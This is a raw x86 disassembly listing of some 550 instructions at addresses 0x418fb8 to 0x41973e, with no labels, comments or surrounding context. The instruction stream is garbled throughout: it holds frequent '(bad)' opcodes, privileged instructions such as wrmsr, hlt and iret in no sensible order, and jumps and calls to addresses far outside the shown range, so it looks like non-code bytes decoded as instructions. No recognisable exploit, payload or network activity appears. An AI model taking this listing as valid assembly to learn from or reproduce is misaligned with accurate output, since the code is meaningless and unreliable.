  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
